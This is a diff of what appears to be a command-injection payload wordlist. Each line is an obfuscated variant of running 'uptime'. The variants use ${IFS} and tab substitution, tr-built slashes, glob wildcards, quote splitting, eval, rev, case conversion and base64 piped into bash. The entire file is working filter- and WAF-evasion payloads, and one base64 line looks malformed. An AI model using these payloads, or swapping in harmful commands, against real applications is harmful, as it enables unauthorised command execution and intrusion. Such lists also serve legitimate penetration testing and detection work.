@@ -1,46 +1,59 @@
 /usr/bin/up[t]ime
 ${PATH:0:1}usr${PATH:0:1}bin${PATH:0:1}up[t]ime
-$(echo${IFS}.${IFS}|${IFS}tr${IFS}'!-0'${IFS}'"-1')usr$(echo${IFS}.${IFS}|${IFS}tr${IFS}'!-0'${IFS}'"-1')bin$(echo${IFS}.${IFS}|${IFS}tr${IFS}'!-0'${IFS}'"-1')up[t]ime
-$(echo%09.%09|%09tr%09'!-0'%09'"-1')usr$(echo%09.%09|%09tr%09'!-0'%09'"-1')bin$(echo%09.%09|%09tr%09'!-0'%09'"-1')up[t]ime
+$(tr '!-}' '"-~'<<<.)usr$(tr '!-}' '"-~'<<<.)bin$(tr '!-}' '"-~'<<<.)up[t]ime
+`tr '!-}' '"-~'<<<.`usr`tr '!-}' '"-~'<<<.`bin`tr '!-}' '"-~'<<<.`up[t]ime
+$(tr${IFS}'!-}'${IFS}'"-~'<<<.)usr$(tr${IFS}'!-}'${IFS}'"-~'<<<.)bin$(tr${IFS}'!-}'${IFS}'"-~'<<<.)up[t]ime
+`tr${IFS}'!-}'${IFS}'"-~'<<<.`usr`tr${IFS}'!-}'${IFS}'"-~'<<<.`bin`tr${IFS}'!-}'${IFS}'"-~'<<<.`up[t]ime
+$(tr%09'!-}'%09'"-~'<<<.)usr$(tr%09'!-}'%09'"-~'<<<.)bin$(tr%09'!-}'%09'"-~'<<<.)up[t]ime
+`tr%09'!-}'%09'"-~'<<<.`usr`tr%09'!-}'%09'"-~'<<<.`bin`tr%09'!-}'%09'"-~'<<<.`up[t]ime
 /usr/bin/up?ime
 ${PATH:0:1}usr${PATH:0:1}bin${PATH:0:1}up?ime
-$(echo${IFS}.${IFS}|${IFS}tr${IFS}'!-0'${IFS}'"-1')usr$(echo${IFS}.${IFS}|${IFS}tr${IFS}'!-0'${IFS}'"-1')bin$(echo${IFS}.${IFS}|${IFS}tr${IFS}'!-0'${IFS}'"-1')up?ime
-$(echo%09.%09|%09tr%09'!-0'%09'"-1')usr$(echo%09.%09|%09tr%09'!-0'%09'"-1')bin$(echo%09.%09|%09tr%09'!-0'%09'"-1')up?ime
+$(tr '!-}' '"-~'<<<.)usr$(tr '!-}' '"-~'<<<.)bin$(tr '!-}' '"-~'<<<.)up?ime
+`tr '!-}' '"-~'<<<.`usr`tr '!-}' '"-~'<<<.`bin`tr '!-}' '"-~'<<<.`up?ime
+$(tr${IFS}'!-}'${IFS}'"-~'<<<.)usr$(tr${IFS}'!-}'${IFS}'"-~'<<<.)bin$(tr${IFS}'!-}'${IFS}'"-~'<<<.)up?ime
+`tr${IFS}'!-}'${IFS}'"-~'<<<.`usr`tr${IFS}'!-}'${IFS}'"-~'<<<.`bin`tr${IFS}'!-}'${IFS}'"-~'<<<.`up?ime
+$(tr%09'!-}'%09'"-~'<<<.)usr$(tr%09'!-}'%09'"-~'<<<.)bin$(tr%09'!-}'%09'"-~'<<<.)up?ime
+`tr%09'!-}'%09'"-~'<<<.`usr`tr%09'!-}'%09'"-~'<<<.`bin`tr%09'!-}'%09'"-~'<<<.`up?ime
 /usr/bin/up*ime
 ${PATH:0:1}usr${PATH:0:1}bin${PATH:0:1}up*ime
-$(echo${IFS}.${IFS}|${IFS}tr${IFS}'!-0'${IFS}'"-1')usr$(echo${IFS}.${IFS}|${IFS}tr${IFS}'!-0'${IFS}'"-1')bin$(echo${IFS}.${IFS}|${IFS}tr${IFS}'!-0'${IFS}'"-1')up*ime
-$(echo%09.%09|%09tr%09'!-0'%09'"-1')usr$(echo%09.%09|%09tr%09'!-0'%09'"-1')bin$(echo%09.%09|%09tr%09'!-0'%09'"-1')up*ime
+$(tr '!-}' '"-~'<<<.)usr$(tr '!-}' '"-~'<<<.)bin$(tr '!-}' '"-~'<<<.)up*ime
+`tr '!-}' '"-~'<<<.`usr`tr '!-}' '"-~'<<<.`bin`tr '!-}' '"-~'<<<.`up*ime
+$(tr${IFS}'!-}'${IFS}'"-~'<<<.)usr$(tr${IFS}'!-}'${IFS}'"-~'<<<.)bin$(tr${IFS}'!-}'${IFS}'"-~'<<<.)up*ime
+`tr${IFS}'!-}'${IFS}'"-~'<<<.`usr`tr${IFS}'!-}'${IFS}'"-~'<<<.`bin`tr${IFS}'!-}'${IFS}'"-~'<<<.`up*ime
+$(tr%09'!-}'%09'"-~'<<<.)usr$(tr%09'!-}'%09'"-~'<<<.)bin$(tr%09'!-}'%09'"-~'<<<.)up*ime
+`tr%09'!-}'%09'"-~'<<<.`usr`tr%09'!-}'%09'"-~'<<<.`bin`tr%09'!-}'%09'"-~'<<<.`up*ime
 u${x}pti${x}me
 u''ptime
-eval "u''ptime"
-e$@val "up$(tr '!-}' '"-~'<<<\!)$(tr '!-}' '"-~'<<<\!)time"
+eval u''ptime
+e$@val${IFS}u''ptime
+e$@val%09u''ptime
 u""ptime
+eval u""ptime
+e$@val${IFS}u""ptime
+e$@val%09u""ptime
 u\p\t\ime
-eval "u\p\t\ime"
-e$@val "u$(tr '!-}' '"-~'<<<[)p$(tr '!-}' '"-~'<<<[)t$(tr '!-}' '"-~'<<<[)ime"
+eval u\p\t\ime
+e$@val${IFS}u\p\t\ime
+e$@val%09u\p\t\ime
+e$@val u$(tr '!-}' '"-~'<<<[)p$(tr '!-}' '"-~'<<<[)t$(tr '!-}' '"-~'<<<[)ime
+e$@val${IFS}u$(tr${IFS}'!-}'${IFS}'"-~'<<<[)p$(tr${IFS}'!-}'${IFS}'"-~'<<<[)t$(tr${IFS}'!-}'${IFS}'"-~'<<<[)ime
+e$@val%09u$(tr%09'!-}'%09'"-~'<<<[)p$(tr%09'!-}'%09'"-~'<<<[)t$(tr%09'!-}'%09'"-~'<<<[)ime
 u$()ptime
 u$@ptime
-$(r$@ev<<<'emitpu')
-$(r$@ev<<<"emitpu")
-`r$@ev<<<'emitpu'`
-`r$@ev<<<"emitpu"`
-$(t$@r '[A-Z]' '[a-z]'<<<'UPTIME')
-$(t$@r${IFS}"[A-Z]"${IFS}"[a-z]"<<<"UPTIME")
-$(t$@r${IFS}'[A-Z]'${IFS}'[a-z]'<<<'UPTIME')
-$(t$@r%09"[A-Z]"%09"[a-z]"<<<"UPTIME")
-$(t$@r%09'[A-Z]'%09'[a-z]'<<<'UPTIME')
-`t$@r "[A-Z]" "[a-z]"<<<"UPTIME"`
-`t$@r '[A-Z]' '[a-z]'<<<'UPTIME'`
-`t$@r${IFS}"[A-Z]"${IFS}"[a-z]"<<<"UPTIME"`
-`t$@r${IFS}'[A-Z]'${IFS}'[a-z]'<<<'UPTIME'`
-`t$@r%09"[A-Z]"%09"[a-z]"<<<"UPTIME"`
-`t$@r%09'[A-Z]'%09'[a-z]'<<<'UPTIME'`
-$(a="UPTIME";pr$@intf %s "${a,,}")
-$(a="DATE";pr$@intf${IFS}%s${IFS}"${a,,}")
-$(a="UPTIME";pr$@intf%09%s%09"${a,,}")
-`a='UPTIME';pr$@intf %s "${a,,}"`
-`a='UPTIME';pr$@intf${IFS}%s${IFS}"${a,,}"`
-`a='UPTIME';pr$@intf%09%s%09"${a,,}"`
+$(r$@ev<<<emitpu)
+`r$@ev<<<emitpu`
+$(t$@r [A-Z] [a-z]<<<UPTIME)
+`t$@r [A-Z] [a-z]<<<UPTIME`
+$(t$@r${IFS}[A-Z]${IFS}[a-z]<<<UPTIME)
+`t$@r${IFS}[A-Z]${IFS}[a-z]<<<UPTIME`
+$(t$@r%09[A-Z]%09[a-z]<<<UPTIME)
+`t$@r%09[A-Z]%09[a-z]<<<UPTIME`
+$(a=UPTIME;pr$@intf %s ${a,,})
+`a=UPTIME;pr$@intf %s ${a,,}`
+$(a=UPTIME;pr$@intf${IFS}%s${IFS}${a,,})
+`a=UPTIME;pr$@intf${IFS}%s${IFS}${a,,}`
+$(a=UPTIME;pr$@intf%09%s%09${a,,})
+`a=UPTIME;pr$@intf%09%s%09${a,,}`
 b$@ash<<<$(ba$@se64 -d<<<dXB0aW1lCg==)
 b$@ash<<<$(ba$@se64${IFS}-d<<<dXB0aW1lCg==)
 b$@ash<<<$(ba$@se64%09%-d<<<dXB0aW1lCg==)
